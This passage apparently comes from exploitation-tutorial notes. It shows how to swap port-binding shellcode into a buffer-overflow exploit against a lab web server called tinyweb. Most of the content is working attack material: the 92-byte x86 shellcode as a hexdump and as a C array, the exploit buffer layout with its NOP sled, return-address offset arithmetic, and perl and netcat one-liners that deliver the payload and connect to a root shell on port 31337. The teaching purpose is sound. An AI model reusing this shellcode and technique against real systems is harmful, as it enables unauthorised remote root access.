When exploiting a remote program, spawning a shell locally is pointless
Port-binding shellcode listens for a TCP connection on a certain port and serves up the shell remotely
Assuming we already have port-binding shellcode ready, using it is simply a matter of replacing the shellcode bytes defined in the exploit
Port-binding shellcode is included in the LiveCD that will bind to port 31337
These shellcode bytes are shown in the output below:

__________________________________________________________________________________
reader@hacking:~/booksrc $ wc -c portbinding_shellcode
92 portbinding_shellcode
reader@hacking:~/booksrc $ hexdump -C portbinding_shellcode
00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80 |jfX.1.CRj.j.....|
00000010  96 6a 66 58 43 52 66 68  7a 69 66 53 89 e1 6a 10 |.jfXCRfhzifS..j.|
00000020  51 56 89 e1 cd 80 b0 66  43 43 53 56 89 e1 cd 80 |QV.....fCCSV....|
00000030  b0 66 43 52 52 56 89 e1  cd 80 93 6a 02 59 b0 3f |.fCRRV.....j.Y.?|
00000040  cd 80 49 79 f9 b0 0b 52  68 2f 2f 73 68 68 2f 62 |..Iy...Rh//shh/b|
00000050  69 6e 89 e3 52 89 e2 53  89 e1 cd 80             |in..R..S....|
0000005c

reader@hacking:~/booksrc $ od -tx1 portbinding_shellcode | cut -c8-80 | sed -e 's/ /\\x/g'
\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80
\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10
\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80
\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f
\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62
\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80
__________________________________________________________________________________
After some quick formatting, these bytes are swapped into the shellcode bytes of the tinyweb_exploit.c program, resulting in tinyweb_exploit2.c
The new shellcode is shown below

NEW LINE FROM tinyweb_exploit2.c
__________________________________________________________________________________
char shellcode[]=
"\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80" 
"\x96\x6a\x66\x58\x43\x52\x66\x68\x7a\x69\x66\x53\x89\xe1\x6a\x10" 
"\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80" 
"\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f" 
"\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62"
"\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80";
// port-binding shellcode on port 31337
__________________________________________________________________________________

When this exploit is compiled and run against a host running tinyweb server, the shellcode listens on port 31337 for a TCP connection
In the output below, a program called nc is used to connect to the shell
This program is called netcat (nc for short), which works like that cat program but over the network
We can't just use telnet to connect since it automatically terminates all outgoing lines with '\r\n'
The output of this exploit is shown below
The -vv command-line option passed to netcat is just to make it more verbose

__________________________________________________________________________________
reader@hacking:~/booksrc $ gcc tinyweb_exploit.c
reader@hacking:~/booksrc $ ./a.out 127.0.0.1
Exploit buffer:
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 31 c0 31 db | ............1.1. 
31 c9 99 b0 a4 cd 80 6a 0b 58 51 68 2f 2f 73 68 | 1......j.XQh//sh 
68 2f 62 69 6e 89 e3 51 89 e2 53 89 e1 cd 80 90 | h/bin..Q..S..... 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 | ................ 
90 90 90 90 90 90 90 90 90 90 90 90 88 f6 ff bf | ................ 
0d 0a                                           | ..

reader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337
localhost [127.0.0.1] 31337 (?) open
whoami
root
ls -l /etc/passwd
-rw-r--r-- 1 root root 1545 Sep 9 16:24 /etc/passwd
__________________________________________________________________________________

Even though the remote shell doesn't display a prompt, it still accepts commands and returns the output over the network

A program like netcat can be used for many other things
It's designed to work like a console program, allowing standard input and output to be piped and redirected
Using netcat and the port-binding shellcode in a file, the same exploit can be carried out on the command line

__________________________________________________________________________________
reader@hacking:~/booksrc $ wc -c portbinding_shellcode
92 portbinding_shellcode

reader@hacking:~/booksrc $ echo $((540+4 - 300 - 92))
152

reader@hacking:~/booksrc $ echo $((152 / 4))
38

reader@hacking:~/booksrc $ (perl -e 'print "\x90"x300';
> cat portbinding_shellcode
> perl -e 'print "\x88\xf6\xff\xbf"x38 . \r\n"')
����������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������jfX�1�CRj j �� �jfXCRfhzifS��j QV�� �fCCSV�� �fCRRV�� �j Y�? Iy��                                 Rh//shh/bin��R��S ���������������������������������������������������������������������������������������������������������������������������������������������

reader@hacking:~/booksrc $ (perl -e 'print "\x90"x300'; cat portbinding_shellcode;
perl -e 'print "\x88\xf6\xff\xbf"x38 . "\r\n"') | nc -v -w1 127.0.0.1 80
localhost [127.0.0.1] 80 (www) open
reader@hacking:~/booksrc $ nc -v 127.0.0.1 31337
localhost [127.0.0.1] 31337 (?) open
whoami
root
__________________________________________________________________________________

In the output above, first the length of the port-binding shellcode is shown to be 92 bytes
The return address is found 540 bytes from the start of the buffer, so with a 300-byte NOP sled and 92 bytes of shellcode, there are 152 bytes to the return address overwrite
This means that if the target return address is repeated 38 times at the end of the buffer, the last one should do the overwrite
Finally, the buffer is terminated with '\r\n'
The commands that build the buffer are grouped with parenthesis to pipe the buffer into netcat, netcat connects to the tinyweb program and sends the buffer
After the shellcode runs, netcat needs to be broken out of by pressing Ctrl-C. since the original socket connection is still open
Then, netcat is used again to connect to the shell bound on port 31337